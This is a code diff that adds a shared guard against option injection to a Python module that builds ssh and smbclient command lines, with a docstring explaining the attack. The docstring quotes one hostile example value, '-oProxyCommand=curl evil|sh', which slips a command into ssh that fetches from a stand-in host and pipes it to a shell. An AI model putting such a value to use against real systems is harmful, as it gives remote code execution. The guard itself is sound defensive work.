@@ -49,6 +49,7 @@ from typing import Any, Callable, ClassVar, Iterable, Sequence
 from ..actions import Action, Observation, Verb
 
 __all__ = [
+    "reject_option_injection",
     "Adapter",
     "CommandResult",
     "AdapterError",
@@ -152,6 +153,32 @@ def run(
         raise AdapterError(f"{' '.join(argv)} failed ({result.returncode}): "
                            f"{result.stderr.strip()[:200]}")
     return result
+
+
+def reject_option_injection(*values: str) -> None:
+    """Refuse argv values a downstream tool would read as an *option*.
+
+    The no-shell design — argv lists, never a command string — removes command
+    injection outright. It does not remove OPTION injection. A value like
+    ``as_user='-oProxyCommand=curl evil|sh'`` is a single argv entry, but ``ssh``
+    and ``smbclient`` parse any argv element beginning with ``-`` as an option
+    rather than as a destination, and ``-oProxyCommand`` executes a command.
+    Destinations and usernames have no legitimate leading dash, so they are
+    refused here rather than passed through.
+
+    This lives in ``base`` because it was previously defined in the Linux
+    adapter alone, and the macOS adapter — which builds the same
+    ``f"{as_user}@{host}"`` ssh destination — had no guard at all. A safety
+    check that exists on one platform and not its sibling is not a safety
+    check; it is an accident of which file someone was reading at the time.
+    """
+    for v in values:
+        if v.startswith("-"):
+            raise AdapterError(
+                f"refusing argument {v!r}: a value beginning with '-' would be "
+                "interpreted as a command-line option by the remote-access tool "
+                "(option injection). Destinations and usernames must not start "
+                "with a dash.")
 
 
 def which(name: str) -> str | None:
